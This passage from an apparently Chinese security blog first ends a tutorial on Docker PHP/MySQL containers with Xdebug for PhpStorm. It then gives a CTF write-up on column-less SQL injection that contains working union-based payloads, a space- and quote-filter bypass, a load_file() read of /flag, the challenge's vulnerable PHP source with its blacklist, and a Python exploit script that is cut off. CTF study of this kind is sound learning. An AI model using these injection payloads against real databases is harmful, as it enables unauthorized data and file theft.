/etc/apt/sources.list</code></pre><p>安装xdebug模块</p><p><code>docker exec -it &lt;id&gt; bash</code>进入容器后</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker-php-ext-install mysqli <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> pecl <span class="token function">install</span> xdebug <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> docker-php-ext-enable xdebug</code></pre><p><strong>注意</strong>：php5.6需要指定版本安装xdebug</p><pre class="language-bash" data-language="bash"><code class="language-bash">RUN docker-php-ext-install mysqli <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> docker-php-ext-install mysql <span class="token punctuation">\</span>    <span class="token operator">&amp;&amp;</span> pecl <span class="token function">install</span> xdebug-2.5.0</code></pre><p>运行<code>php -m</code> 发现已经安装好xdebug模块</p><h3 id="修改php-ini"><a href="#修改php-ini" class="headerlink" title="修改php.ini"></a>修改php.ini</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini<span class="token function">vim</span> /usr/local/etc/php/php.ini</code></pre><p>添加</p><pre class="language-none"><code class="language-none">[XDebug]xdebug.remote_enable&#x3D;Onxdebug.remote_host&#x3D;host.docker.internalxdebug.remote_port&#x3D;9000xdebug.auto_trace&#x3D;Onxdebug.collect_vars&#x3D;Onxdebug.collect_return&#x3D;Onxdebug.collect_params&#x3D;Onxdebug.idekey&#x3D;phpstormxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;</code></pre><p>写进去之后重启apache服务 <code>apache2ctl restart</code></p><p>查看phpinfo，访问<a href="http://127.0.0.1:[port]">http://127.0.0.1:[port]</a></p><img src="/article/phpstormdebug/image-20210331131421851.png" class="" title="xdebug" loading="lazy"><hr><h2 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h2><p>php多版本+mysql服务</p><p>目录结构</p><pre class="language-none"><code class="language-none">|docker-compose.yml└--5.6 └-Dockerfile└--7.4 └-Dockerfile</code></pre><p>Docker-compose.yml，如果需要起不同或更多的版本，照着修改yml和Dockerfile即可</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">php5.6</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./5.6/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:5.6-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10001<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always <span class="token comment"># 自动重启，一般用于开机自启</span>    <span class="token key atrule">mysql</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql/mysql<span class="token punctuation">-</span>server<span class="token punctuation">:</span><span class="token number">5.6</span>        <span class="token key atrule">environment</span><span class="token punctuation">:</span>             <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token string">"&lt;password>"</span> <span class="token comment"># 自设mysql的password</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 3306<span class="token punctuation">:</span><span class="token number">3306</span> <span class="token comment"># 由于映射端口，密码需设强密码，否则请关闭端口映射</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">php7.4</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./7.4/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:7.4-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10002<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always</code></pre><p>5.6的Dockerfile(此处未使用更新换源方法，如报错或有需要可自行更换)</p><pre class="language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> php:5.6-apache</span><span class="token instruction"><span class="token keyword">RUN</span> echo <span class="token string">'deb http://mirrors.aliyun.com/debian/ buster main non-free contrib \  deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \  deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \  deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib \  deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib'</span>> /etc/apt/sources.list <span class="token operator">\</span>    &amp;&amp; apt update &amp;&amp; apt install -y vim</span><span class="token instruction"><span class="token keyword">RUN</span> [<span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"echo -e \"xdebug.remote_enable=On\nxdebug.remote_host=host.docker.internal\nxdebug.remote_port=9000\nxdebug.auto_trace=On\nxdebug.collect_vars=On\nxdebug.collect_return=On\nxdebug.collect_params=On\nxdebug.idekey=phpstorm\nxdebug.remote_log='/tmp/xdebug.log'\" >> /usr/local/etc/php/conf.d/myconfig.ini"</span>]</span><span class="token instruction"><span class="token keyword">RUN</span> docker-php-ext-install mysqli <span class="token operator">\</span>    &amp;&amp; docker-php-ext-install mysql <span class="token operator">\</span>    &amp;&amp; pecl install xdebug-2.5.0 \ # 指定xdebug版本</span>    &amp;&amp; docker-php-ext-enable xdebug<span class="token instruction"><span class="token keyword">RUN</span> apache2ctl restart</span></code></pre><p>7.4的dockerfile(此处未使用更新换源方法，如报错或有需要可自行更换)</p><pre class="language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> php:7.4-apache</span><span class="token instruction"><span class="token keyword">RUN</span> echo <span class="token string">'deb http://mirrors.aliyun.com/debian/ buster main non-free contrib \  deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \  deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \  deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \  deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib \  deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib'</span>> /etc/apt/sources.list <span class="token operator">\</span>    &amp;&amp; apt update &amp;&amp; apt install -y vim</span><span class="token instruction"><span class="token keyword">RUN</span> [<span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"echo -e \"xdebug.remote_enable=On\nxdebug.remote_host=host.docker.internal\nxdebug.remote_port=9000\nxdebug.auto_trace=On\nxdebug.collect_vars=On\nxdebug.collect_return=On\nxdebug.collect_params=On\nxdebug.idekey=phpstorm\nxdebug.remote_log='/tmp/xdebug.log'\" >> /usr/local/etc/php/conf.d/myconfig.ini"</span>]</span><span class="token instruction"><span class="token keyword">RUN</span>  docker-php-ext-install mysqli <span class="token operator">\</span>    &amp;&amp; pecl install xdebug-2.9.0 \ # 最好也指定下版本</span>    &amp;&amp; docker-php-ext-enable xdebug<span class="token instruction"><span class="token keyword">RUN</span> apache2ctl restart</span></code></pre><p>在docker-compose.yml所在目录运行<code>docker-compose up -d</code></p><img src="/article/phpstormdebug/image-20210331160533708.png" class="" title="dockercompose" loading="lazy"><p>如图所示，在映射目录写个phpinfo，用不同端口访问本地可见版本不同，可以非常灵活地调试</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><p>xdebug模块也加载好了</p><hr><h2 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="配置phpstorm"></a>配置phpstorm</h2><p>在本地映射目录下新建项目并打开，点击右上角配置</p><img src="/article/phpstormdebug/image-20210331132235844.png" class="" title="configuration" loading="lazy"><img src="/article/phpstormdebug/image-20210331132633011.png" class="" title="con" loading="lazy"><img src="/article/phpstormdebug/image-20210331132745496.png" class="" title="image-20210331132745496" loading="lazy"><p>打开<code>设置Preferences-&gt;Build,Execution,Deployment-&gt;Deployment</code></p><img src="/article/phpstormdebug/image-20210331133638675.png" class="" title="deployment" loading="lazy"><p>打开<code>Run-&gt;Web Server Debug Validation</code></p><img src="/article/phpstormdebug/F4ECC4D5-59CE-4CA5-8304-9DC190624212.png" class="" title="validation" loading="lazy"><p>Chrome浏览器安装debug插件</p><img src="/article/phpstormdebug/image-20210331133929212.png" class="" title="debug" loading="lazy"><img src="/article/phpstormdebug/image-20210331133947378.png" class="" title="xdebug" loading="lazy"><p>然后就可以惹</p><hr><h2 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h2><p>一般来说都是在本地搭建环境，尽量别放有公网vps的服务器上…会被打</p><h3 id="页面测试"><a href="#页面测试" class="headerlink" title="页面测试"></a>页面测试</h3><p>映射目录写phpinfo()，访问对应端口的容器</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><h3 id="mysql测试-一键部署可用"><a href="#mysql测试-一键部署可用" class="headerlink" title="mysql测试(一键部署可用)"></a>mysql测试(一键部署可用)</h3><p>映射目录写<code>mysqltest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;password>"</span><span class="token punctuation">;</span> <span class="token comment">// 自设的mysql密码</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:"</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>http://127.0.0.1:[port]/mysqltest.php</code></p><img src="/article/phpstormdebug/image-20210331161909008.png" class="" title="5.6mysql" loading="lazy"><img src="/article/phpstormdebug/image-20210331161926189.png" class="" title="7.4mysql" loading="lazy"><p>测试完毕</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL无列名注入</title>
      <link href="article/mardasctf/"/>
      <url>article/mardasctf/</url>
      
        <content type="html"><![CDATA[<p>sql注入的姿势</p><span id="more"></span><p>以DASCTF三月赛为例，记录下无列名注入。</p><h2 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h2><p>例如join进行无列名注入，现在有张表<code>table</code>如下</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>question</th><th>token</th></tr></thead><tbody><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>正常<strong>在数据库查询</strong>，表名需带反引号，在php端中<strong>并不需要</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195606802.png" class="" title="table" loading="lazy"><p>假设不知道列名，通过union查询，需猜测列数，这里为5列</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195833956.png" class="" title="union" loading="lazy"><p>如图所示，列名被替换成了数字，</p><table><thead><tr><th>1（派生表列1）</th><th>2（派生表列2）</th><th>3（派生表列3）</th><th>4（派生表列4）</th><th>5（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>我们可以进一步用数字来对应列查询</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329200819627.png" class="" title="union2" loading="lazy"><p>如果反引号被过滤，同样继续用别名代替</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> c <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">as</span> d <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329201418814.png" class="" title="别名" loading="lazy"><p>此时派生表如下</p><table><thead><tr><th>1（派生表列1）</th><th>b（原派生表列2）</th><th>3（派生表列3）</th><th>c（原派生表列4）</th><th>d（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>同时查询多个列</p><pre class="language-none"><code class="language-none">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from &#96;table&#96;)a;</code></pre><p><code>0x2d</code>为<code>-</code></p><img src="/article/mardasctf/image-20210329202408382.png" class="" title="concat" loading="lazy"><hr><p>以下是比赛WP</p><h3 id="DASCTF三月赛·bestDB"><a href="#DASCTF三月赛·bestDB" class="headerlink" title="DASCTF三月赛·bestDB"></a>DASCTF三月赛·bestDB</h3><blockquote><p>由于电脑崩了:(  bp和网页都没了，只能凭我写了</p></blockquote><p>进去一个查询框，题目名字有db，肯定是注入了。</p><p>注释中发现hint</p><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;!-- SELECT * FROM users WHERE id = '$query' OR username = \"$query\" --!></code></pre><p>这就建个数据库测试，经测试发现ban了空格和单引号，测试出了payload</p><p><code>-1&quot;union/**/select/**/1,2,3&quot;</code></p><img src="/article/mardasctf/image-20210329193545757.png" class="" title="union" loading="lazy"><p>回显位为1和2，改改以前的脚本，查数据库名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,database(),3"</span><span class="token comment"># databases==========>users</span></code></pre><p>查表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"</span><span class="token comment"># tables==========>f1agdas,users</span></code></pre><p>无列名查询(其实直接查就好，本人复习一下之前的知识)</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/f1agdas/**/limit/**/1,1)a),3"</span><span class="token comment"># data==========>flag.txt</span></code></pre><hr><p>查到<code>f1agdas</code>表里有个<code>flag.txt</code>，应该是利用<code>load_file()</code>函数读取文件，查了下用户</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,user(),3"</span><span class="token comment"># user==========>'root'@'localhost'</span></code></pre><p>肯定有权限了，读了<code>index.php</code>和<code>dbConnect.php</code>，给复现的师傅参考</p><pre class="language-php" data-language="php"><code class="language-php">// index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'dbConnect.php'</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'drop'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$item</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Forbidden!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token variable">$query</span></span>' OR username = \"<span class="token interpolation"><span class="token variable">$query</span></span>\""</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>&lt;tr>&lt;th>ID&lt;/th>&lt;th>UserName&lt;/th>&lt;/tr>"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;/tr>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/table>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">// dbConnect.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$serve</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'users'</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysqli</span><span class="token punctuation">(</span><span class="token variable">$serve</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'connect error:'</span><span class="token operator">.</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">set_charset</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置数据库字符集</span></span></code></pre><p>读取根目录下flag，由于ban了<code>flag</code>，转十六进制即可</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,hex(load_file(0x2f666c6167)),3"</span></code></pre><p><code>hex(&#39;/flag&#39;)==&#39;0x2f666c6167&#39;</code></p><p>结束了</p><p>附上小脚本，虽然没啥用</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 27, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://ea4d13de-db0a-41e5-b303-a843bd51a27b.machine.dasctf.com/?query="</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Forbidden"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Forbidden"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"right"</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,database(),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># databases==========>users</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select group_concat(table_name) from information_schema.tables where table_schema like database()),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># tables==========>f1agdas,users</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select `2` from (select 1,2 union select * from f1agdas limit 1,1)a),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># flag.columns==========>flag.txt</span><span class="token 